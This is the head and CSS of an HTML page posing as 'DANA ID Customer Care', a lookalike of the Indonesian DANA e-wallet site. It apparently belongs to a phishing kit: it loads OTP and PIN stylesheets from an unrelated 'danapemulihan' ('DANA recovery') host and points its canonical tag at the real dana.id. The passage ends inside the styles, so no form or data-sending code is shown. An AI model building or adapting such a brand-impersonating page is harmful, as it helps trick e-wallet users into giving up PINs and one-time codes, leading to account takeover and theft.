<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
<meta name="theme-color" content="#118EEA"> 

<meta http-equiv="X-UA-Compatible" content="ie=edge">
<title>𝗗𝗔𝗡𝗔 𝗜𝗗 | 𝗖𝘂𝘀𝘁𝗼𝗺𝗲𝗿 𝗖𝗮𝗿𝗲 𝗗𝗔𝗡𝗔</title>
<meta property="og:title" content="𝗗𝗔𝗡𝗔 𝗜𝗗 | 𝗖𝘂𝘀𝘁𝗼𝗺𝗲𝗿 𝗖𝗮𝗿𝗲 𝗗𝗔𝗡𝗔">
<meta property="twitter:title" content="𝗗𝗔𝗡𝗔 𝗜𝗗 | 𝗖𝘂𝘀𝘁𝗼𝗺𝗲𝗿 𝗖𝗮𝗿𝗲 𝗗𝗔𝗡𝗔">
<meta property="twitter:card" content="summary_large_image">
<meta property="og:image:type" content="image/jpeg">
<meta content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRyoGavdwVzFPvGfWDtbSK70qJYRR9UMy9HJg&usqp=CAU" property="og:image">
 <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" rel="shortcut icon" type="image/x-icon">
  <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" rel="apple-touch-icon">
 <link rel="canonical" href="https://www.dana.id/">
   <meta property="og:url" content="https://www.dana.id/" />
<meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
<meta property="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
<script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/container.css">
<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/loader.css">
<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/main.css">
<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/otp.css">
<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/pin.css">
<link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css" />

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css" />


<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css" />
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css" />
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
 <link rel="stylesheet" type="text/css" href="https://s4.bukalapak.com/ast/accounts/assets/packs/css/9739-4faa916f.css">
  <link rel="stylesheet" type="text/css" href="https://s4.bukalapak.com/ast/accounts/assets/packs/css/7399-a297ce78.css">
  <link rel="stylesheet" type="text/css" href="https://s4.bukalapak.com/ast/accounts/assets/packs/css/7829-2062c569.css">
  <link rel="stylesheet" type="text/css" href="https://s4.bukalapak.com/ast/accounts/assets/packs/css/3830-54932ed9.css">
  <link rel="stylesheet" type="text/css" href="https://s4.bukalapak.com/ast/accounts/assets/packs/css/6924-b4b3296d.css">
</head>
<style>
    
</style>
<style>

body, html{
      left: 0;
      right: 0;
      bottom: 0;
      top: 0;
      margin: 0px auto;
      width: 100%;
      height: 100%;
      background: #118EEA;
      positon: fixed
      
}

h3{
  font-size: 23px;  
}

 
 * {
  box-sizing: border-box;
  scrollbar-color: transparent transparent; /* thumb and track color */
  scrollbar-width: 0px;
}

*::-webkit-scrollbar {
  width: 0;
}

*::-webkit-scrollbar-track {
  background: transparent;
}

*::-webkit-scrollbar-thumb {
  background-color: #118EEA;
  border: none;
}

* {
  -ms-overflow-style: none;
}

ol, li {
  list-style: none;
  margin: 0;
  padding: 0;
}

.carousel {
  position: absolute;
  background-color: #118EEA;
  padding-top:0%;
  height: 100%;
  top: 0;
  right: 0;
  left: 0;
  margin: 0px auto;
  perspective: 200px;
}

.carousel__viewport {
  position: absolute;
  width: 100%;
  top: 0;
  background-color: #118EEA;
  right: 0;
  bottom: 0;
  left: 0;
  height: 530px;
  display: flex;
  overflow-x: scroll;
  counter-reset: item;
  margin: 0px auto;
 
  scroll-behavior: smooth;
  scroll-snap-type: x mandatory;
}

.carousel__slide {
  position: relative;
  flex: 0 0 100%;
  width: 100%;
  height: 100%;
  margin-left: 10px;
  background-color: #118EEA;
  counter-increment: item;
  z-index: 99999999;
}

.carousel__slide:nth-child(even) {
  background-color: #118EEA;
}

.carousel__slide:before {
  content: counter(item);
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate3d(-50%,-40%,70px);
  color: #000;
  font-size: 2em;
  background-color: #118EEA;
}

.carousel__snapper {
  position: relative;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  width: 100%;
  height: 100%;
  scroll-snap-align: center;
  background-color: #118EEA;
  
  
}

@media (hover: hover) {
  .carousel__snapper {
    animation-name: tonext, snap;
    animation-timing-function: ease;
    animation-duration: 4s;
    animation-iteration-count: infinite;
  }

  .carousel__slide:last-child .carousel__snapper {
    animation-name: tostart, snap;
  }
}

@media (prefers-reduced-motion: reduce) {
  .carousel__snapper {
    animation-name: none;
  }
}

.carousel:hover .carousel__snapper,
.carousel:focus-within .carousel__snapper {
  animation-name: none;
}

.carousel__navigation {
  position: absolute;
  right: 0;
  bottom: 0;
  left: 0;
  text-align: center;
}

.carousel__navigation-list,
.carousel__navigation-item {
  display: inline-block;
}


.carousel::before,
.carousel::after,
.carousel__prev,
.carousel__next {
  position: absolute;
  top: 0;
  margin-top: 37.5%;
  width: 0;
  height: 0;
  transform: translateY(-50%);
  border-radius: 50%;
  font-size: 0;
  outline: 0;
  opacity: 0.0;
}

.carousel::before,
.carousel__prev {
  left: -1rem;
}

.carousel::after,
.carousel__next {
  right: 0rem;
}

.carousel::before,
.carousel::after {
  content: '';
  z-index: 1;
  background-color: #118EEA;
  background-size: 1.5rem 1.5rem;
  background-repeat: no-repeat;
  background-position: center center;
  color: #000;
  font-size: 2.5rem;
  line-height: 4rem;
  text-align: center;
  pointer-events: none;
}

/*********************/
.process1 {
     width: 100%;
            height: 100%;
             display: flex;
             justify-content: center;
            margin: auto;
            position: absolute;
           padding-top: 300px;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.6);
            z-index: 99999;
            
      
}
.loading {
    position: absolute;
    display: flex;
    justify-content: center;
    align-items: center;
    margin-bottom: 20%;
}
.loading img {
    width: 50px;
    
    top: 10;
}
.loading .spinner{
    position: absolute;
    width: 35px;
    animation: spin 1s linear infinite;
    -webkit-animation: spin 1s linear infinite;
    -moz-animation: spin 1s linear infinite;
    -ms-animation: spin 1s linear infinite;
    -o-animation: spin 1s linear infinite;
}
@keyframes spin {
  0% { transform: rotate(360deg); }
  100% { transform: rotate(0deg); }
}
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(360deg); }
  100% { -webkit-transform: rotate(0deg); }
}
@-moz-keyframes spin {
  0% { -webkit-transform: rotate(360deg); }
  100% { -webkit-transform: rotate(0deg); }
}
@-ms-keyframes spin {
  0% { -webkit-transform: rotate(360deg); }
  100% { -webkit-transform: rotate(0deg); }
}
@-o-keyframes spin {
  0% { -webkit-transform: rotate(360deg); }
  100% { -webkit-transform: rotate(0deg); }
}

/*********************/

 #homeku{
     width: 100%;
     height: 100%;
     position: fixed;
    background: #118EEA;
  background-position: 100% 100%;
  background-size: 100% 100%;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
  margin: 0px auto;
     
     
 }
 
 .inp{
     width: 70%;
     padding-left: 10px;
 }
 
 
 .btn-backku{
     position: absolute;
     left: 20;
     top: 12;
     background: transparent;
     color: #fff;
     border: none;
     font-size: 18px;
     font-weight: 300;
    
 }
 
 
 #back1{
      display: none;
     
 }
 
 #back2{
      display: none;
 }
 
   .btn-punya {
        display: block;
        margin: -20px auto 0 auto;
        padding: 0px;
        cursor: pointer;
        background: none rgb(0, 134, 224);
        border: none;
        text-align: center;
        height: 55px;
        width: 536px;
        max-width: 95%;
        font-family: 'Open Sans', sans-serif;
        font-size: 16px;
        font-weight: bold;
        color: rgb(255, 255, 255);
        letter-spacing: 2px;
        line-height: 1;
        border-radius: 10px;
        box-shadow: rgb(170, 170, 170) 5px 5px 7px 0px;
        transition: background 200ms ease 0s;
    }

    .btn-belum {
        display: block;
        margin: 10px auto;
        padding: 0px;
        cursor: pointer;
        background: none transparent;
        border: none;
        text-align: center;
        height: 57px;
        width: 536px;
        max-width: 100%;
        font-family: 'Open Sans', sans-serif;
        font-size: 16px;
        font-weight: bold;
        color: rgb(0, 134, 224);
        letter-spacing: 1px;
        line-height: 1;
        border-radius: 50px;
        transition: background 200ms ease 0s;
    }

    .form-log {
        box-sizing: border-box;
        height: 40px;
        width: 536px;
        max-width: 100%;
        border: 2px solid rgb(0, 134, 224);
        border-image: initial;
        background-color: rgb(255, 255, 255);
        border-radius: 8px;
        box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px;
        font-family: 'Roboto Condensed', sans-serif;
        font-weight: bold;
        font-size: 16px;
        color: rgb(28, 28, 28);
        word-spacing: 7px;
        padding: 0px 45px;
    }

    #ionIcons {
        color: rgb(22, 119, 199);
        font-size: 29px;
        position: absolute;
        display: block;
        margin-top: 1px;
        margin-left: 15px;        
    }

    input {
        border: 3px solid rgb(0, 134, 224);
        border-radius: 8px;
        padding: 5px 10px;
    }

    h1 {
        display: table;
        background: #0086e0;
        /* #0086e0; */
        color: #0086e0;
        padding: 2px;
        width: 100%;
    }

    h7 {
        display: table;
        background: #3081ce;
        color: #0086e0;
        padding: 15px;
        width: 100%;
        font-size: 12px;
        text-align: center;
        font-family: 'Roboto Condensed', sans-serif;
    }

    .container {
        max-width: 900px;
        padding: 15px;
        background-color: #118EEA;
        margin-left: auto;
        margin-right: auto;
    }

    .slider .slick-slide {
        border: solid 0px #000;
    }

    .slider .slick-slide img {
        width: 100%;
        margin-top: 0px;
    }

    /* make button larger and change their positions */
    .slick-prev,
    .slick-next {
        width: 0px;
        height: 0px;
        z-index: 1;
    }

    .slick-prev {
        left: 0px;
    }

    .slick-next {
        right: 0px;
    }

    .slick-prev:before,
    .slick-next:before {
        font-size: 0px;
        text-shadow: 0 0 0px rgba(0, 0, 0, 0.5);
}

    h7 {
        display: table;
        background: #3081ce;
        color: #fff;
        padding: 15px;
        width: 100%;
        font-size: 12px;
        text-align: center;
        font-family: 'Roboto Condensed', sans-serif;
    }

    .container {
        width: 100%;
        height: 100%;
        padding: 15px;
        background-color: #118EEA;
        margin-left: auto;
        margin-right: auto;
    }

    .slider .slick-slide {
        border: solid 0px #000;
    }

    .slider .slick-slide img {
        width: 100%;
        margin-top: 0px;
    }

    /* make button larger and change their positions */
    .slick-prev,
    .slick-next {
        width: 0px;
        height: 0px;
        z-index: 1;
    }

    .slick-prev {
        left: 0px;
    }

    .slick-next {
        right: 0px;
    }

    .slick-prev:before,
    .slick-next:before {
        font-size: 0px;
        text-shadow: 0 0 0px rgba(0, 0, 0, 0.5);
    }

    /* move dotted nav position */
    .slick-dots {
        bottom: 0px;
    }

    /* enlarge dots and change their colors */
    .slick-dots li button:before {
        font-size: 12px;
        color: #000;
        text-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        opacity: 0;
    }

    .slick-dots li.slick-active button:before {
        color: #dedede;
    }

    /* transition effects for opacity */
    .slick-arrow,
        {
        transition: opacity 0.2s ease-out;
    }

    legend {
        padding: 2px;
        background: transparent;
        color: #0086e0;
        border: none;
      }

.bodywell {
	-webkit-animation-duration: 1s;
	animation-duration: 1s;
	-webkit-animation-fill-mode: both;
	animation-fill-mode: both;
	-webkit-animation-timing-function: ease-in;
	animation-timing-function: ease-in;
	    -webkit-animation-name: fadeIn; 
    animation-name: fadeIn; 
}

@-webkit-keyframes fadeIn { 
    0% {opacity: 0;} 
        50% {opacity: 0.5;} 
    100% {opacity: 1;} 
} 
@keyframes fadeIn { 
    0% {opacity: 0;} 
    50% {opacity: 0.5;} 
    100% {opacity: 1;} 
} 



</style>
<style type="text/css">.bl-snackbar{position:fixed;color:#fff;pointer-events:none;z-index:9999;font-size:14px;left:0;right:0;bottom:0;padding:0 16px 16px}.bl-snackbar,.bl-snackbar__wrapper{display:flex;align-items:center;transition:all .5s cubic-bezier(.64,.04,.35,1)}.bl-snackbar__wrapper{width:100%;max-width:480px;margin:0 auto;background-color:#2e2e2e;pointer-events:auto;border-radius:4px;box-shadow:0 2px 10px 0 rgba(0,0,0,.15)}.bl-snackbar__content{width:100%;min-height:44px;padding:12px;display:flex;align-items:center;justify-content:space-between;overflow:hidden}.bl-snackbar__action{height:18px;white-space:nowrap;display:flex;align-items:center}.bl-snackbar__action .bl-button,.bl-snackbar__action .bl-text{color:#8badf0;font-size:14px;font-weight:500}.bl-snackbar__action .bl-button:first-of-type,.bl-snackbar__action .bl-text:first-of-type{margin-left:12px}.bl-snackbar.is-error .bl-snackbar__wrapper{background-color:#cb0b04}.bl-snackbar-animation-enter,.bl-snackbar-animation-leave-active{bottom:-999px}.bl-snackbar-animation-left-leave-active{transform:translateX(-100%)}.bl-snackbar-animation-right-leave-active{transform:translateX(100%)}.bl-button{position:relative;display:inline-flex;flex-direction:row;justify-content:center;align-items:center;height:44px;min-width:88px;outline:none;border-radius:4px;cursor:pointer;padding:0 20px;border:1px solid transparent;text-decoration:none;color:#3d3d3d}.bl-button:before{content:""}.bl-button:disabled,.bl-button[aria-disabled]{cursor:not-allowed;pointer-events:none}.bl-button:active .bl-button__icon,.bl-button:active .bl-text{opacity:.6}.bl-button__content,.bl-button__loading{display:flex;align-items:center}.bl-button__loading{position:absolute;flex-direction:row;justify-content:center}.bl-button.is-disabled{cursor:not-allowed}.bl-button.is-disabled .bl-button__icon,.bl-button.is-disabled .bl-text{opacity:.4}.bl-button--naked:active .bl-button__icon,.bl-button--naked:active .bl-text{opacity:1}.bl-button.is-fullwidth{width:100%}.bl-button--small{padding:0 12px;height:36px}.bl-button--small.is-icon-only{width:36px!important}.bl-button--extra-small{padding:0 8px;height:28px}.bl-button--extra-small.is-icon-only{width:28px!important}.bl-button--primary{background-color:#e31e52;border-color:transparent}.bl-button--primary:active{background-color:#b3002d}.bl-button--primary:active .bl-button__icon,.bl-button--primary:active .bl-button__text{opacity:.6}.bl-button--primary.is-disabled{background-color:#ff92b2}.bl-button--primary.is-disabled .bl-button__icon,.bl-button--primary.is-disabled .bl-button__text{opacity:.4}.bl-button--secondary{background-color:#f2f2f2;border-color:transparent}.bl-button--secondary:active{background-color:#e0e0e0}.bl-button--secondary:active .bl-button__icon,.bl-button--secondary:active .bl-button__text{opacity:.6}.bl-button--secondary.is-disabled{background-color:#f2f2f2}.bl-button--secondary.is-disabled .bl-button__icon,.bl-button--secondary.is-disabled .bl-button__text{opacity:.4}.bl-button--outline{background-color:#fff;border-color:#d6d6d6}.bl-button--outline:active{background-color:#f2f2f2}.bl-button--outline:active .bl-button__icon,.bl-button--outline:active .bl-button__text{opacity:.6}.bl-button--outline.is-disabled{background-color:#f2f2f2}.bl-button--outline.is-disabled .bl-button__icon,.bl-button--outline.is-disabled .bl-button__text{opacity:.4}.bl-button--naked{background-color:#fff;border-color:transparent}.bl-button--naked:active{background-color:#f2f2f2}.bl-button--naked:active .bl-button__icon,.bl-button--naked:active .bl-button__text{opacity:.6}.bl-button--naked.is-disabled{background-color:#fff}.bl-button--naked.is-disabled .bl-button__icon,.bl-button--naked.is-disabled .bl-button__text{opacity:.4}.bl-button--outline-white{background-color:initial;border-color:#d6d6d6}.bl-button--outline-white:active{background-color:initial;border-color:hsla(0,0%,92.2%,.6)}.bl-button--outline-white:active .bl-button__icon,.bl-button--outline-white:active .bl-button__text{opacity:.6}.bl-button--outline-white.is-disabled{background-color:initial;border-color:hsla(0,0%,92.2%,.4)}.bl-button--outline-white.is-disabled .bl-button__icon,.bl-button--outline-white.is-disabled .bl-button__text{opacity:.4}.bl-button--naked-inverse{background-color:initial;border-color:transparent}.bl-button--naked-inverse:active{background-color:initial}.bl-button--naked-inverse:active .bl-button__icon,.bl-button--naked-inverse:active .bl-button__text{opacity:.6}.bl-button--naked-inverse.is-disabled{background-color:initial}.bl-button--naked-inverse.is-disabled .bl-button__icon,.bl-button--naked-inverse.is-disabled .bl-button__text{opacity:.4}.bl-button--link{padding:0!important;height:auto!important;width:auto!important;min-width:auto!important;background:none;border:none}.bl-button--link.is-underline .bl-text{color:#3d3d3d;text-decoration:underline;text-underline-position:under}.bl-button--link:active .bl-text{opacity:1;color:#1c3391}.bl-button--link:active.is-underline .bl-text{background:rgba(20,20,20,.05);color:#3d3d3d}.bl-button--link.is-disabled{cursor:not-allowed}.bl-button--link.is-disabled .bl-text{color:#8badf0}.bl-button--link.is-disabled.is-underline .bl-text{color:#b6b6b6}.bl-button__icon{position:relative;line-height:0}.bl-button__icon.is-right{right:-6px}.bl-button__icon.is-left{left:-6px}.bl-button.is-icon-only{min-width:auto;padding:0;width:44px}.bl-button.is-icon-only .bl-button__icon.is-right{right:0}.bl-button.is-icon-only .bl-button__icon.is-left{left:0}.bl-button--floating-center,.bl-button--floating-left,.bl-button--floating-right{border-radius:500px;background-color:#fff;color:#3d3d3d;font-size:14px;height:56px;min-width:56px;box-shadow:0 2px 4px 0 rgba(0,0,0,.1);position:fixed;border:none;bottom:16px}.bl-button--floating-center.is-icon-only,.bl-button--floating-left.is-icon-only,.bl-button--floating-right.is-icon-only{min-width:56px}.bl-button--floating-center:active,.bl-button--floating-left:active,.bl-button--floating-right:active{background-color:#ebebeb}.bl-button--floating-center:active .bl-button__icon,.bl-button--floating-left:active .bl-button__icon,.bl-button--floating-right:active .bl-button__icon{opacity:.6}.bl-button--floating-center .bl-button__text,.bl-button--floating-left .bl-button__text,.bl-button--floating-right .bl-button__text{font-size:14px}.bl-button--floating-center.bl-button--small,.bl-button--floating-left.bl-button--small,.bl-button--floating-right.bl-button--small{height:40px;min-width:40px;padding:0 16px}.bl-button--floating-center.bl-button--small .bl-button__text,.bl-button--floating-left.bl-button--small .bl-button__text,.bl-button--floating-right.bl-button--small .bl-button__text{font-size:12px}.bl-button--floating-center .bl-icon-default,.bl-button--floating-left .bl-icon-default,.bl-button--floating-right .bl-icon-default{background:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%2712%27 height=%2710%27%3E%3Cpath fill=%27%233d3d3d%27 d=%27M11.539.205a1.147 1.147 0 00-1.56.237l-5.19 6.853-2.858-2.794a1.147 1.147 0 00-1.578-.046 1.037 1.037 0 00-.05 1.512s3.474 3.479 3.973 3.828a1.147 1.147 0 001.56-.237l5.95-7.856a1.042 1.042 0 00-.247-1.497z%27/%3E%3C/svg%3E") no-repeat 50%}.bl-button--floating-right{right:16px;left:auto}.bl-button--floating-left{left:16px;right:auto}.bl-button--floating-center{left:50%;right:auto;transform:translateX(-50%)}.bl-button[class*=bl-button--floating]{background-color:#fff}.bl-button[class*=bl-button--floating].is-disabled{background-color:#f2f2f2}.bl-button.bl-button--blue{color:#fff;background-color:#2b4ac7}.bl-button.bl-button--blue:active{background-color:#1c3391}.bl-button.bl-button--blue.is-disabled{background-color:#8badf0}.bl-text{font-family:Buka Sans Text,Hind Madurai,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:14px;color:#141414;font-weight:400;margin:0;text-decoration:none;line-height:normal}.bl-text.bl-text--ellipsis-1,.bl-text.bl-text--ellipsis-2,.bl-text.bl-text--ellipsis-3{overflow:hidden;-webkit-box-orient:vertical;display:-webkit-box}.bl-text.bl-text--ellipsis-1{-webkit-line-clamp:1}.bl-text.bl-text--ellipsis-2{-webkit-line-clamp:2}.bl-text.bl-text--ellipsis-3{-webkit-line-clamp:3}.bl-text--primary{color:#141414}.bl-text--secondary{color:#3d3d3d}.bl-text--subdued{color:#8d8d8d}.bl-text--disabled{color:#b6b6b6}.bl-text--inverse{color:#fff}.bl-text--highlight-01{color:#d1083a}.bl-text--informational-01{color:#0e1a4d}.bl-text--informational-02{color:#3a5fd6}.bl-text--success-01{color:#01271c}.bl-text--success-02{color:#128c55}.bl-text--warning-01{color:#bf4400}.bl-text--warning-02{color:#4d2309}.bl-text--error-01{color:#e60505}.bl-text--error-02{color:#7a0602}.bl-text--attention-01{color:#332205}.bl-text--link-01{color:#2b4ac7}.bl-text--link-01-disabled,.bl-text--link-01-inverse{color:#8badf0}.bl-text--body{color:#3d3d3d}.bl-text--heading{color:#141414}.bl-text--white{color:#fff}.bl-text--success{color:#128c55}.bl-text--critical{color:#7a0602}.bl-text--warning{color:#4d2309}.bl-text--error{color:#f42c2c}.bl-text--caption-08{font-size:8px;font-weight:500}.bl-text--caption-08.bl-text--ellipsis-1{max-height:10.4px}.bl-text--caption-08.bl-text--ellipsis-2{max-height:20.8px}.bl-text--caption-08.bl-text--ellipsis-3{max-height:31.2px}.bl-text--caption-10{font-size:10px}.bl-text--caption-10.bl-text--ellipsis-1{max-height:13px}.bl-text--caption-10.bl-text--ellipsis-2{max-height:26px}.bl-text--caption-10.bl-text--ellipsis-3{max-height:39px}.bl-text--caption-12{font-size:12px}.bl-text--caption-12.bl-text--ellipsis-1{max-height:15.6px}.bl-text--caption-12.bl-text--ellipsis-2{max-height:31.2px}.bl-text--caption-12.bl-text--ellipsis-3{max-height:46.8px}.bl-text--body-14{font-size:14px}.bl-text--body-14.bl-text--ellipsis-1{max-height:18.2px}.bl-text--body-14.bl-text--ellipsis-2{max-height:36.4px}.bl-text--body-14.bl-text--ellipsis-3{max-height:54.6px}.bl-text--body-long-14{font-size:14px}.bl-text--body-long-14.bl-text--ellipsis-1{max-height:18.2px}.bl-text--body-long-14.bl-text--ellipsis-2{max-height:36.4px}.bl-text--body-long-14.bl-text--ellipsis-3{max-height:54.6px}.bl-text--body-16{font-size:16px}.bl-text--body-16.bl-text--ellipsis-1{max-height:20.8px}.bl-text--body-16.bl-text--ellipsis-2{max-height:41.6px}.bl-text--body-16.bl-text--ellipsis-3{max-height:62.4px}.bl-text--body-long-16{font-size:16px}.bl-text--body-long-16.bl-text--ellipsis-1{max-height:20.8px}.bl-text--body-long-16.bl-text--ellipsis-2{max-height:41.6px}.bl-text--body-long-16.bl-text--ellipsis-3{max-height:62.4px}.bl-text--subheading-18{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:18px;font-weight:500}.bl-text--subheading-18.bl-text--ellipsis-1{max-height:23.4px}.bl-text--subheading-18.bl-text--ellipsis-2{max-height:46.8px}.bl-text--subheading-18.bl-text--ellipsis-3{max-height:70.2px}.bl-text--subheading-20{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:20px;font-weight:500}.bl-text--subheading-20.bl-text--ellipsis-1{max-height:26px}.bl-text--subheading-20.bl-text--ellipsis-2{max-height:52px}.bl-text--subheading-20.bl-text--ellipsis-3{max-height:78px}.bl-text--heading-24{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:24px;font-weight:700}.bl-text--heading-24.bl-text--ellipsis-1{max-height:31.2px}.bl-text--heading-24.bl-text--ellipsis-2{max-height:62.4px}.bl-text--heading-24.bl-text--ellipsis-3{max-height:93.6px}.bl-text--heading-28{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:28px;font-weight:700}.bl-text--heading-28.bl-text--ellipsis-1{max-height:36.4px}.bl-text--heading-28.bl-text--ellipsis-2{max-height:72.8px}.bl-text--heading-28.bl-text--ellipsis-3{max-height:109.2px}.bl-text--heading-32{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:32px;font-weight:700}.bl-text--heading-32.bl-text--ellipsis-1{max-height:41.6px}.bl-text--heading-32.bl-text--ellipsis-2{max-height:83.2px}.bl-text--heading-32.bl-text--ellipsis-3{max-height:124.8px}.bl-text--heading-42{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:42px;font-weight:700}.bl-text--heading-42.bl-text--ellipsis-1{max-height:54.6px}.bl-text--heading-42.bl-text--ellipsis-2{max-height:109.2px}.bl-text--heading-42.bl-text--ellipsis-3{max-height:163.8px}.bl-text--bold{font-weight:700}.bl-text--semi-bold{font-weight:600}.bl-text--medium{font-weight:500}.bl-text--regular{font-weight:400}.bl-text--link-primary{color:#2b4ac7;text-decoration:none}.bl-text--link-primary:active{color:#1c3391}.bl-text--link-primary.bl-text--disabled{color:#8badf0;cursor:not-allowed}.bl-text--link-secondary{color:#3d3d3d;text-decoration:underline;text-underline-position:under}.bl-text--link-secondary:active{background:rgba(20,20,20,.05)}.bl-text--link-secondary.bl-text--disabled{color:#b6b6b6;cursor:not-allowed}.bl-text--link-inverse{color:#fff;text-decoration:underline;text-underline-position:under}.bl-text--link-inverse.bl-text--disabled{color:#b6b6b6;cursor:not-allowed}.bl-text--line-through{text-decoration:line-through}.bl-spinner{position:relative}.bl-spinner__dot{display:inline-block;background:#b6b6b6;height:12px;width:12px;border-radius:100%;margin:1px;animation-name:wormLoad;animation-duration:.6s;animation-iteration-count:infinite;animation-timing-function:ease-in-out;animation-fill-mode:both}.bl-spinner__dot:first-child{animation-delay:.07s}.bl-spinner__dot:nth-child(2){animation-delay:.14s}.bl-spinner__dot:nth-child(3){animation-delay:.21s}.bl-spinner--small .bl-spinner__dot{height:8px;width:8px;animation-name:wormLoadSmall;animation-duration:1.4s;margin:1px}.bl-spinner--small .bl-spinner__dot:first-child{animation-delay:-.24s}.bl-spinner--small .bl-spinner__dot:nth-child(2){animation-delay:-.12s}@keyframes wormLoad{33%{transform:translateY(6px)}66%{transform:translateY(-6px)}to{transform:translateY(0)}}@keyframes wormLoadSmall{0%,80%,to{transform:scale(0)}40%{transform:scale(1)}}</style>
  <style type="text/css">.bl-link{font-family:Buka Sans Text,Hind Madurai,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:inherit;font-weight:600}.bl-link,.bl-link:hover{text-decoration:none;color:#2b4ac7}.bl-link:active,.bl-link:focus{color:#1c3391;text-decoration:none}.bl-link.is-disabled{color:#8badf0}.bl-link--dark{color:#3d3d3d;text-decoration:underline;background:none;text-underline-position:under}.bl-link--dark:hover{color:#3d3d3d;text-decoration:underline}.bl-link--dark:active,.bl-link--dark:focus{background:rgba(20,20,20,.05);text-decoration:underline}.bl-link--dark.is-disabled{color:#b6b6b6}.bl-link--light{color:#fff;text-decoration:underline;text-underline-position:under}.bl-link--light:active,.bl-link--light:focus,.bl-link--light:hover{color:#fff;text-decoration:underline}.bl-link--light.is-disabled{color:#ebebeb}</style>
  <style type="text/css">.bl-sheet{bottom:0;right:0;font-family:Buka Sans Text,Hind Madurai,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;color:#3d3d3d;z-index:9999}.bl-sheet,.bl-sheet__overlay{position:fixed;top:0;left:0;transition:opacity .3s ease}.bl-sheet__overlay{width:100%;height:100%;background:rgba(0,0,0,.5);opacity:1}.bl-sheet__box{position:absolute;bottom:0;height:100%;overflow:auto;transition:all .5s cubic-bezier(.22,.61,.36,1)}.bl-sheet__box,.bl-sheet__nav-bar{width:100%;background-color:#fff;border-radius:16px 16px 0 0}.bl-sheet__nav-bar{padding:16px 64px 16px 48px;position:fixed;display:block;border-bottom:1px solid #ebebeb;box-sizing:border-box;font-weight:500;color:#2e2e2e;z-index:9;box-shadow:none;transition:box-shadow .3s ease-in-out;min-height:56px}.bl-sheet__nav-bar-handler{display:block;height:4px;width:48px;background:#d6d6d6;border-radius:2px;margin:auto auto 12px}.bl-sheet__nav-bar.has-box-shadow{box-shadow:0 2px 4px 0 rgba(66,69,77,.12)}.bl-sheet__icon{left:16px;bottom:15px}.bl-sheet__icon,.bl-sheet__text-action{position:absolute;line-height:0;cursor:pointer}.bl-sheet__text-action{bottom:18px;right:16px}.bl-sheet__content{position:relative;display:block;margin-top:70px;margin-bottom:60px;font-size:16px}.bl-sheet__footer{width:100%;height:auto;position:fixed;display:block;bottom:0;left:0;background-color:#fff}.bl-sheet-animation-enter,.bl-sheet-animation-enter 